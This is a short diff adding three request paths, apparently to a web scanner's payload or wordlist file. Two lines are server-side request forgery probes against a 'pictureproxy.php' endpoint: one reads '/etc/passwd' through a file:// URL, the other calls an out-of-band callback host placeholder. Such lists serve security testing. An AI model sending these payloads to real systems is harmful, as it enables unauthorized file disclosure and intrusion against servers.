@@ -1,0 +1,3 @@
+/file/config.py
+/pictureproxy.php?url=file:///etc/passwd
+/pictureproxy.php?url=http://{{interactsh-url}}
